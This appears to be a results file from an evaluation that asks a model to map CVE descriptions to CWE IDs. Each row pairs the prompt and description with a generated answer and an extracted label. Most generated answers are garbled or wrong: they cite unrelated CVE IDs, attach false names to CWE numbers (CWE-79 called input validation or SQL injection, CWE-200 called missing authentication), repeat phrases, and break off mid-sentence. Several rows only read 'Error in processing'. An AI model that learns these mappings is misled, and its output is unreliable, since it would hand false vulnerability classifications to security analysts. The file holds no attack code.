+CVE Description: Concrete CMS version 9 before 9.2.5 is vulnerable to  stored XSS via the Role Name field since there is insufficient validation of administrator provided data for that field. A rogue administrator could inject malicious code into the Role Name field which might be executed when users visit the affected page. The Concrete CMS Security team scored this 2 with CVSS v3 vector  AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:L/A:N https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator. Concrete versions below 9 do not include group types so they are not affected by this vulnerability.
+CVE ID: CVE-2019-12106
+CWE ID: CWE-79
+CVE Reference: https://nvd.nist.gov/vuln-metrics/cve/cve-2019-12106
+CWE Reference: https"	CWE-79
+Cross-site scripting vulnerability in a-blog cms Ver.3.1.x series versions prior to Ver.3.1.7, Ver.3.0.x series versions prior to Ver.3.0.29, Ver.2.11.x series versions prior to Ver.2.11.58, Ver.2.10.x series versions prior to Ver.2.10.50, and Ver.2.9.0 and earlier allows a remote authenticated attacker to execute an arbitrary script on the logged-in user's web browser.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross-site scripting vulnerability in a-blog cms Ver.3.1.x series versions prior to Ver.3.1.7, Ver.3.0.x series versions prior to Ver.3.0.29, Ver.2.11.x series versions prior to Ver.2.11.58, Ver.2.10.x series versions prior to Ver.2.10.50, and Ver.2.9.0 and earlier allows a remote authenticated attacker to execute an arbitrary script on the logged-in user's web browser.
+Solution: CWE-79
+
+The vulnerability exists due to the fact that the CMS does not properly validate user input. This allows an attacker to execute arbitrary code on the logged-in user's web browser."	CWE-79
+A vulnerability exists in Rockwell Automation FactoryTalk® Service Platform that allows a malicious user to obtain the service token and use it for authentication on another FTSP directory. This is due to the lack of digital signing between the FTSP service token and directory.  If exploited, a malicious user could potentially retrieve user information and modify settings without any authentication.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability exists in Rockwell Automation FactoryTalk® Service Platform that allows a malicious user to obtain the service token and use it for authentication on another FTSP directory. This is due to the lack of digital signing between the FTSP service token and directory.  If exploited, a malicious user could potentially retrieve user information and modify settings without any authentication.
+CWE ID: CWE-200: Missing Authentication
+The CWE ID number for this vulnerability is 200. This is the CWE ID number for the CWE-200: Missing Authentication vulnerability. This vulnerability is a CWE-200: Missing Authentication vulnerability."	CWE-200
+Nextcloud server is a self hosted personal cloud system. In affected versions OAuth codes did not expire. When an attacker would get access to an authorization code they could authenticate at any time using the code. As of version 28.0.0 OAuth codes are invalidated after 10 minutes and will no longer be authenticated. To exploit this vulnerability an attacker would need to intercept an OAuth code from a user session. It is recommended that the Nextcloud Server is upgraded to 28.0.0. There are no known workarounds for this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Nextcloud server is a self hosted personal cloud system. In affected versions OAuth codes did not expire. When an attacker would get access to an authorization code they could authenticate at any time using the code. As of version 28.0.0 OAuth codes are invalidated after 10 minutes and will no longer be authenticated. To exploit this vulnerability an attacker would need to intercept an OAuth code from a user session. It is recommended that the Nextcloud Server is upgraded to 28.0.0. There are no known workarounds for this vulnerability.
+WASC: 2020-1208
+CVE: CVE-2020-1208
+CWE: CWE-200
+CWE-200: Improper Input Validation
+CWE-200: Improper Validation of User Input
+C"	CWE-200
+A vulnerability was found in RRJ Nueva Ecija Engineer Online Portal 1.0. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file /admin/admin_user.php of the component Admin Panel. The manipulation of the argument Firstname/Lastname/Username leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-249433 was assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in RRJ Nueva Ecija Engineer Online Portal 1.0. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file /admin/admin_user.php of the component Admin Panel. The manipulation of the argument Firstname/Lastname/Username leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-249433 was assigned to this vulnerability.
+The CWE name is CWE-79: Improper Authentication or Authorization of Content."	CWE-79
+A plug-in manager origin validation vulnerability in the Trend Micro Apex One security agent could allow a local attacker to escalate privileges on affected installations.  Please note: an attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.  This vulnerability is similar to, but not identical to, CVE-2023-47201.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A plug-in manager origin validation vulnerability in the Trend Micro Apex One security agent could allow a local attacker to escalate privileges on affected installations.  Please note: an attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.  This vulnerability is similar to, but not identical to, CVE-2023-47201.
+CWE ID: CWE-200
+
+In the Trend Micro Apex One security agent, a local attacker could escalate privileges on affected installations by executing arbitrary code on the target system.  The attacker must first obtain the ability to execute low-privileged code on"	CWE-200
+StrangeBee TheHive 5.1.0 to 5.1.9 and 5.2.0 to 5.2.8 is vulnerable to Cross Site Scripting (XSS) in the case attachment functionality which enables an attacker to upload a malicious HTML file with Javascript code that will be executed in the context of the The Hive application using a specific URL. The vulnerability can be used to coerce a victim account to perform specific actions on the application as helping an analyst becoming administrator.	Error in processing	Error
+Sulu is a highly extensible open-source PHP content management system based on the Symfony framework. There is an issue when inputting HTML into the Tag name. The HTML is executed when the tag name is listed in the auto complete form. Only admin users can create tags so they are the only ones affected. The problem is patched with version(s) 2.4.16 and 2.5.12.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Sulu is a highly extensible open-source PHP content management system based on the Symfony framework. There is an issue when inputting HTML into the Tag name. The HTML is executed when the tag name is listed in the auto complete form. Only admin users can create tags so they are the only ones affected. The problem is patched with version(s) 2.4.16 and 2.5.12.
+CWE ID: CWE-79: Improper Input Validation
+CWE ID: CWE-79: Improper Input Validation
+
+## Response:
+
+### CWE-79: Improper Input Validation
+
+A CWE is a classification scheme for software vulnerabilities. It"	CWE-79
+A vulnerability, which was classified as critical, was found in Youke365 up to 1.5.3. Affected is an unknown function of the file /app/api/controller/caiji.php of the component Parameter Handler. The manipulation of the argument url leads to server-side request forgery. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-249870 is the identifier assigned to this vulnerability.	Error in processing	Error
+Cross-site scripting (XSS) vulnerability in XunRuiCMS versions v4.6.2 and before, allows remote attackers to obtain sensitive information via crafted malicious requests to the background login.	Error in processing	Error
+The Chatbot for WordPress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via admin settings in version 2.3.9 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with administrator-level permissions and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This only affects multi-site installations and installations where unfiltered_html has been disabled.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Chatbot for WordPress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via admin settings in version 2.3.9 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with administrator-level permissions and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This only affects multi-site installations and installations where unfiltered_html has been disabled.
+CWE ID: CWE-79 (Improper Input Validation)"	CWE-79
+In the Linux kernel, the following vulnerability has been resolved:  net/mlx5e: Wrap the tx reporter dump callback to extract the sq  Function mlx5e_tx_reporter_dump_sq() casts its void * argument to struct mlx5e_txqsq *, but in TX-timeout-recovery flow the argument is actually of type struct mlx5e_tx_timeout_ctx *.   mlx5_core 0000:08:00.1 enp8s0f1: TX timeout detected  mlx5_core 0000:08:00.1 enp8s0f1: TX timeout on queue: 1, SQ: 0x11ec, CQ: 0x146d, SQ Cons: 0x0 SQ Prod: 0x1, usecs since last trans: 21565000  BUG: stack guard page was hit at 0000000093f1a2de (stack is 00000000b66ea0dc..000000004d932dae)  kernel stack overflow (page fault): 0000 [#1] SMP NOPTI  CPU: 5 PID: 95 Comm: kworker/u20:1 Tainted: G W OE 5.13.0_mlnx #1  Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS rel-1.13.0-0-gf21b5a4aeb02-prebuilt.qemu.org 04/01/2014  Workqueue: mlx5e mlx5e_tx_timeout_work [mlx5_core]  RIP: 0010:mlx5e_tx_reporter_dump_sq+0xd3/0x180  [mlx5_core]  Call Trace:  mlx5e_tx_reporter_dump+0x43/0x1c0 [mlx5_core]  devlink_health_do_dump.part.91+0x71/0xd0  devlink_health_report+0x157/0x1b0  mlx5e_reporter_tx_timeout+0xb9/0xf0 [mlx5_core]  ? mlx5e_tx_reporter_err_cqe_recover+0x1d0/0x1d0  [mlx5_core]  ? mlx5e_health_queue_dump+0xd0/0xd0 [mlx5_core]  ? update_load_avg+0x19b/0x550  ? set_next_entity+0x72/0x80  ? pick_next_task_fair+0x227/0x340  ? finish_task_switch+0xa2/0x280    mlx5e_tx_timeout_work+0x83/0xb0 [mlx5_core]    process_one_work+0x1de/0x3a0    worker_thread+0x2d/0x3c0  ? process_one_work+0x3a0/0x3a0    kthread+0x115/0x130  ? kthread_park+0x90/0x90    ret_from_fork+0x1f/0x30  --[ end trace 51ccabea504edaff ]---  RIP: 0010:mlx5e_tx_reporter_dump_sq+0xd3/0x180  PKRU: 55555554  Kernel panic - not syncing: Fatal exception  Kernel Offset: disabled  end Kernel panic - not syncing: Fatal exception  To fix this bug add a wrapper for mlx5e_tx_reporter_dump_sq() which extracts the sq from struct mlx5e_tx_timeout_ctx and set it as the TX-timeout-recovery flow dump callback.	Error in processing	Error
+A vulnerability has been identified in JT2Go (All versions < V14.3.0.6), Teamcenter Visualization V13.3 (All versions < V13.3.0.13), Teamcenter Visualization V14.1 (All versions < V14.1.0.12), Teamcenter Visualization V14.2 (All versions < V14.2.0.9), Teamcenter Visualization V14.3 (All versions < V14.3.0.6). The affected applications contain a null pointer dereference vulnerability while parsing specially crafted CGM files. An attacker could leverage this vulnerability to crash the application causing denial of service condition.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability has been identified in JT2Go (All versions < V14.3.0.6), Teamcenter Visualization V13.3 (All versions < V13.3.0.13), Teamcenter Visualization V14.1 (All versions < V14.1.0.12), Teamcenter Visualization V14.2 (All versions < V14.2.0.9), Teamcenter Visualization V14.3 (All versions < V14.3.0.6). The affected applications contain a null pointer dereference vulnerability while parsing specially crafted CGM files. An attacker could leverage this vulnerability to crash the application causing denial of service condition.
+The CWE ID number for this vulnerability is: CWE-362
+
+Your response should be a minimum of 150 words. You should include a justification for the CWE ID number and a detailed explanation of the vulnerability. You should also include the CWE ID number"	CWE-362
+Stored Cross-Site Scripting (XSS) vulnerability in POSCMS v4.6.2, allows attackers to execute arbitrary code via a crafted payload to /index.php?c=install&m=index&step=2&is_install_db=0.	Error in processing	Error
+A vulnerability, which was classified as critical, has been found in 个人开源 mldong 1.0. This issue affects the function ExpressionEngine of the file com/mldong/modules/wf/engine/model/DecisionModel.java. The manipulation leads to code injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251561 was assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability, which was classified as critical, has been found in 个人开源 mldong 1.0. This issue affects the function ExpressionEngine of the file com/mldong/modules/wf/engine/model/DecisionModel.java. The manipulation leads to code injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251561 was assigned to this vulnerability.
+CVE ID: CVE-2017-14798
+
+CWE ID: CWE-79
+
+The following CWE description and justification was found in the description of the vulnerability:
+```
+The function ExpressionEngine of the file com/mldong/modules/wf"	CWE-79
+Nullptr dereference in paddle.crop in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Nullptr dereference in paddle.crop in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.
+CWE ID: CWE-476
+CWE Description: A null pointer dereference vulnerability exists in the paddle.crop function in the paddle library before 2.6.0. An attacker can exploit this vulnerability to cause a crash of the system or"	CWE-476
+The EventON WordPress plugin before 4.5.5, EventON WordPress plugin before 2.2.7 does not sanitize and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup).	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The EventON WordPress plugin before 4.5.5, EventON WordPress plugin before 2.2.7 does not sanitize and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup).
+CWE ID: CWE-79: Improper Restriction of Operations within the Same Packet
+CVE ID: CVE-2018-11803
+
+The EventON WordPress plugin before 4.5.5, EventON WordPress plugin before 2"	CWE-79
+An OS command injection vulnerability in Hardy Barth cPH2 eCharge Ladestation v1.87.0 and earlier, may allow an unauthenticated remote attacker to execute arbitrary commands on the system via a specifically crafted arguments passed to the connectivity check feature.	Error in processing	Error
+A Missing Authentication for Critical Function vulnerability combined with a Generation of Error Message Containing Sensitive Information vulnerability in J-Web of Juniper Networks Junos OS on SRX Series and EX Series allows an unauthenticated, network-based attacker to access sensitive system information.  When a user logs in, a temporary file which contains the configuration of the device (as visible to that user) is created in the /cache folder. An unauthenticated attacker can then attempt to access such a file by sending a specific request to the device trying to guess the name of such a file. Successful exploitation will reveal configuration information.  This issue affects Juniper Networks Junos OS on SRX Series and EX Series:   *  All versions earlier than 20.4R3-S9;   *  21.2 versions earlier than 21.2R3-S7;   *  21.3 versions earlier than 21.3R3-S5;   *  21.4 versions earlier than 21.4R3-S6;   *  22.1 versions earlier than 22.1R3-S5;   *  22.2 versions earlier than 22.2R3-S3;   *  22.3 versions earlier than 22.3R3-S2;   *  22.4 versions earlier than 22.4R3;   *  23.2 versions earlier than 23.2R1-S2, 23.2R2.	Error in processing	Error
+Dell BIOS contains a Signed to Unsigned Conversion Error vulnerability. A local authenticated malicious user with admin privileges could potentially exploit this vulnerability, leading to denial of service.	Error in processing	Error
+A vulnerability classified as critical was found in Juanpao JPShop up to 1.5.02. This vulnerability affects the function actionIndex of the file /api/controllers/merchant/app/ComboController.php of the component API. The manipulation of the argument pic_url leads to unrestricted upload. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-253000.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as critical was found in Juanpao JPShop up to 1.5.02. This vulnerability affects the function actionIndex of the file /api/controllers/merchant/app/ComboController.php of the component API. The manipulation of the argument pic_url leads to unrestricted upload. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-253000.
+The CWE ID for this vulnerability is CWE-89. The identifier of the vulnerability is VDB-253000.
+
+## Answer
+
+CVE Description: A vulnerability classified as critical was found in Juanpao JPShop up to 1.5.02"	CWE-89
+LightCMS v2.0 is vulnerable to Cross Site Scripting (XSS) in the Content Management - Articles field.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: LightCMS v2.0 is vulnerable to Cross Site Scripting (XSS) in the Content Management - Articles field.
+```
+LightCMS v2.0 is vulnerable to Cross Site Scripting (XSS) in the Content Management - Articles field.
+```
+```
+CWE-79 Cross-Site Scripting (XSS)
+```
+```
+Cross-S"	CWE-79
+The POST SMTP WordPress plugin before 2.8.7 does not sanitise and escape the msg parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The POST SMTP WordPress plugin before 2.8.7 does not sanitise and escape the msg parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin.
+Solution: CWE-79: Improper Neutralisation of Special Elements used in an SQL Command ('SQL Injection') CWE-79: Improper Neutralisation of Special Elements used in an SQL Command ('SQL Injection')
+The solution to the vulnerability is to sanitize"	CWE-79
+An unauthenticated reflected cross-site scripting (XSS) vulnerability in QStar Archive Solutions Release RELEASE_3-0 Build 7 allows attackers to execute arbitrary javascript on a victim's browser via a crafted link.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An unauthenticated reflected cross-site scripting (XSS) vulnerability in QStar Archive Solutions Release RELEASE_3-0 Build 7 allows attackers to execute arbitrary javascript on a victim's browser via a crafted link.
+```
+CVE-2021-40258
+
+CWE-79: Uncontrolled Resource Consumption
+```
+## Analysis
+
+The CVE description states that the application is vulnerable to uncontrolled resource consumption because the application does not properly validate the URL that is"	CWE-79
+A vulnerability was found in ZhongFuCheng3y Austin 1.0 and classified as critical. This issue affects the function getFile of the file com/java3y/austin/web/controller/MaterialController.java of the component Upload Material Menu. The manipulation leads to unrestricted upload. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250619.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in ZhongFuCheng3y Austin 1.0 and classified as critical. This issue affects the function getFile of the file com/java3y/austin/web/controller/MaterialController.java of the component Upload Material Menu. The manipulation leads to unrestricted upload. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250619.
+The CWE definition is: CWE-264: Unrestricted File Upload
+The CWE name is: Unrestricted File Upload
+The CWE description: Unrestricted File Upload: Unrestricted file upload may lead to arbitrary code execution, file inclusion, and other attacks"	CWE-264
+KiTTY versions 0.76.1.13 and before is vulnerable to a stack-based buffer overflow via the hostname, occurs due to insufficient bounds checking and input sanitization. This allows an attacker to overwrite adjacent memory, which leads to arbitrary code execution.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: KiTTY versions 0.76.1.13 and before is vulnerable to a stack-based buffer overflow via the hostname, occurs due to insufficient bounds checking and input sanitization. This allows an attacker to overwrite adjacent memory, which leads to arbitrary code execution.
+```
+CVE-2016-10033
+```
+  1. CWE ID: CWE-400: Improper Limitation of a Pathname to a Restricted Directory
+  2. CWE ID: CWE-400: Improper Limit"	CWE-400
+An issue fixed in AIT-Deutschland Alpha Innotec Heatpumps V2.88.3 or later, V3.89.0 or later, V4.81.3 or later and Novelan Heatpumps V2.88.3 or later, V3.89.0 or later, V4.81.3 or later, allows remote attackers to execute arbitrary code via the password component in the shadow file.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An issue fixed in AIT-Deutschland Alpha Innotec Heatpumps V2.88.3 or later, V3.89.0 or later, V4.81.3 or later and Novelan Heatpumps V2.88.3 or later, V3.89.0 or later, V4.81.3 or later, allows remote attackers to execute arbitrary code via the password component in the shadow file.
+CWE ID: CWE-20
+
+The vulnerability is caused by a race condition in the way the password is stored in the shadow file. The vulnerability exists because the password is stored in the shadow file in the password component, and the file is not"	CWE-20
+The Ni Purchase Order(PO) For WooCommerce WordPress plugin through 1.2.1 does not validate logo and signature image files uploaded in the settings, allowing high privileged user to upload arbitrary files to the web server, triggering an RCE vulnerability by uploading a web shell.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Ni Purchase Order(PO) For WooCommerce WordPress plugin through 1.2.1 does not validate logo and signature image files uploaded in the settings, allowing high privileged user to upload arbitrary files to the web server, triggering an RCE vulnerability by uploading a web shell.
+CWE ID: CWE-400 CWE-79 CWE-20 CWE-22 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE-20 CWE"	CWE-400
+Cross-Site Request Forgery (CSRF) vulnerability in WP Spell Check.This issue affects WP Spell Check: from n/a through 9.17.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in WP Spell Check.This issue affects WP Spell Check: from n/a through 9.17.
+The CWE ID number is 264.
+The last part of your response should contain only the CWE ID number.
+
+### Related Answers
+
+  - Analysis of the CVE description for CWE-264
+  - Analysis of the CVE description for CWE-264"	CWE-264
+The EventON - WordPress Virtual Event Calendar Plugin plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 4.5.4 (Pro) & 2.2.8 (Free). This is due to missing or incorrect nonce validation on the save_virtual_event_settings function. This makes it possible for unauthenticated attackers to modify virtual event settings via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The EventON - WordPress Virtual Event Calendar Plugin plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 4.5.4 (Pro) & 2.2.8 (Free). This is due to missing or incorrect nonce validation on the save_virtual_event_settings function. This makes it possible for unauthenticated attackers to modify virtual event settings via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.
+CVE ID: CVE-2016-1263
+
+CWE ID: CWE-79
+CWE Description:
+The EventON - WordPress Virtual Event Calendar Plugin plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to,"	CWE-79
+Insecure Permissions vulnerability in BossCMS v.1.3.0 allows a local attacker to execute arbitrary code and escalate privileges via the init function in admin.class.php component.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Insecure Permissions vulnerability in BossCMS v.1.3.0 allows a local attacker to execute arbitrary code and escalate privileges via the init function in admin.class.php component.
+```
+CWE-78: Improper Control of Initialization
+```
+Explanation: The BossCMS project is a free and open source CMS (content management system) for web sites. BossCMS is a simple and easy-to-use CMS that is designed"	CWE-78
+An issue in the imlib_free_image_and_decache function of imlib2 v1.9.1 allows attackers to cause a heap buffer overflow via parsing a crafted image.	Error in processing	Error
+A vulnerability classified as critical has been found in CodeAstro Real Estate Management System up to 1.0. This affects an unknown part of the file propertydetail.php. The manipulation of the argument pid leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250713 was assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as critical has been found in CodeAstro Real Estate Management System up to 1.0. This affects an unknown part of the file propertydetail.php. The manipulation of the argument pid leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250713 was assigned to this vulnerability.
+CVE ID: CVE-2015-5635
+CWE ID: CWE-89
+
+Explanation: This is a vulnerability in the propertydetail.php file of the CodeAstro Real Estate Management System. The problem is that the argument pid is not"	CWE-89
+An issue was discovered in the CampaignEvents extension in MediaWiki before 1.35.14, 1.36.x through 1.39.x before 1.39.6, and 1.40.x before 1.40.2. The Special:EventDetails page allows XSS via the x-xss language setting for internationalization (i18n).	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An issue was discovered in the CampaignEvents extension in MediaWiki before 1.35.14, 1.36.x through 1.39.x before 1.39.6, and 1.40.x before 1.40.2. The Special:EventDetails page allows XSS via the x-xss language setting for internationalization (i18n).
+CVE ID: CVE-2022-4167
+
+CWE ID: CWE-79
+
+The CWE-79 CWE-79 CWE-79 CWE-79 CWE-79 CWE-79 CWE-79 CWE-79 CWE-79 CWE-79"	CWE-79
+SQL Injection vulnerability in Quest Analytics LLC IQCRM v.2023.9.5 allows a remote attacker to execute arbitrary code via a crafted request to the Common.svc WSDL page.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: SQL Injection vulnerability in Quest Analytics LLC IQCRM v.2023.9.5 allows a remote attacker to execute arbitrary code via a crafted request to the Common.svc WSDL page.
+Solution:
+```
+CWE ID: CWE-79: Improper Input Validation
+```
+## Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number."	CWE-79
+Integer overflow vulnerability in FFmpeg before n6.1, allows remote attackers to execute arbitrary code via the jpegxl_anim_read_packet component in the JPEG XL Animation decoder.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Integer overflow vulnerability in FFmpeg before n6.1, allows remote attackers to execute arbitrary code via the jpegxl_anim_read_packet component in the JPEG XL Animation decoder.
+CWE ID: CWE-119 - Improper Limitation of a Pathname to a Restricted Directory
+CVE ID: CVE-2017-14995
+CVE Reference: http://www.cve.mitre.org/cgi-bin/cvename.cgi?"	CWE-119
+Deserialization of Untrusted Data in jeecgFormDemoController in JEECG 4.0 and earlier allows attackers to run arbitrary code via crafted POST request.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Deserialization of Untrusted Data in jeecgFormDemoController in JEECG 4.0 and earlier allows attackers to run arbitrary code via crafted POST request.
+CVE ID: CVE-2019-11301
+CWE ID: CWE-20
+The CWE definition of this issue can be found here: https://cwe.mitre.org/data/definitions/20.html
+The CWE definition of this issue"	CWE-20
+Cross-Site Scripting (XSS) vulnerability in Sunlight CMS 8.0.1 allows an authenticated low-privileged user to escalate privileges via a crafted SVG file in the File Manager component.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross-Site Scripting (XSS) vulnerability in Sunlight CMS 8.0.1 allows an authenticated low-privileged user to escalate privileges via a crafted SVG file in the File Manager component.
+CVE ID: CVE-2020-11364
+CWE ID: CWE-79
+
+The vulnerability is caused by the lack of input validation in the File Manager component. A user with low privileges can upload a file with malicious SVG content to the"	CWE-79
+Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function setIptvInfo.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function setIptvInfo.
+```
+Tenda AX1803 v1.0.0.1
+```
+```
+CWE-79: Improper Restriction of Operations within the Bounds of a Memory Buffer
+CWE-20: Improper Input Validation
+``"	CWE-79
+Loop with Unreachable Exit Condition ('Infinite Loop') vulnerability in Apache Commons Compress.This issue affects Apache Commons Compress: from 1.3 through 1.25.0.  Users are recommended to upgrade to version 1.26.0 which fixes the issue.	Error in processing	Error
+OS command injection vulnerability in ELECOM wireless LAN routers allows a network-adjacent attacker with an administrative privilege to execute arbitrary OS commands by sending a specially crafted request to the product. Affected products and versions are as follows: WRC-X1800GS-B v1.17 and earlier, WRC-X1800GSA-B v1.17 and earlier, WRC-X1800GSH-B v1.17 and earlier, WRC-X6000XS-G v1.09, and WRC-X6000XST-G v1.12 and earlier.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: OS command injection vulnerability in ELECOM wireless LAN routers allows a network-adjacent attacker with an administrative privilege to execute arbitrary OS commands by sending a specially crafted request to the product. Affected products and versions are as follows: WRC-X1800GS-B v1.17 and earlier, WRC-X1800GSA-B v1.17 and earlier, WRC-X1800GSH-B v1.17 and earlier, WRC-X6000XS-G v1.09, and WRC-X6000XST-G v1.12 and earlier.
+CWE ID: CWE-78 (CWE-78) (CWE-78) (CWE-78) (CWE-78) (CWE-78) (CWE-78) (CWE-78) ("	CWE-78
+The Print Invoice & Delivery Notes for WooCommerce WordPress plugin before 4.7.2 is vulnerable to reflected XSS by echoing a GET value in an admin note within the WooCommerce orders page. This means that this vulnerability can be exploited for users with the edit_others_shop_orders capability. WooCommerce must be installed and active. This vulnerability is caused by a urldecode() after cleanup with esc_url_raw(), allowing double encoding.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Print Invoice & Delivery Notes for WooCommerce WordPress plugin before 4.7.2 is vulnerable to reflected XSS by echoing a GET value in an admin note within the WooCommerce orders page. This means that this vulnerability can be exploited for users with the edit_others_shop_orders capability. WooCommerce must be installed and active. This vulnerability is caused by a urldecode() after cleanup with esc_url_raw(), allowing double encoding.
+This vulnerability is reported by OWASP Top 10 2017, CWE-79 (Reference: https://cwe.mitre.org/data/definitions/79.html)
+The CWE ID is 79.
+
+  - CWE ID: 79"	CWE-79
+Reflected cross-site scripting (XSS) vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an exploit against an authenticated victim that visits a malicious link provided by an attacker.  Please note, this vulnerability is similar to, but not identical to, CVE-2023-41177.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Reflected cross-site scripting (XSS) vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an exploit against an authenticated victim that visits a malicious link provided by an attacker.  Please note, this vulnerability is similar to, but not identical to, CVE-2023-41177.
+Please provide a justification for your answer.
+
+CWE ID: CWE-78
+Description: Reflected XSS vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an attacker to execute arbitrary code on an affected system by exploiting a user interface element. Please"	CWE-78
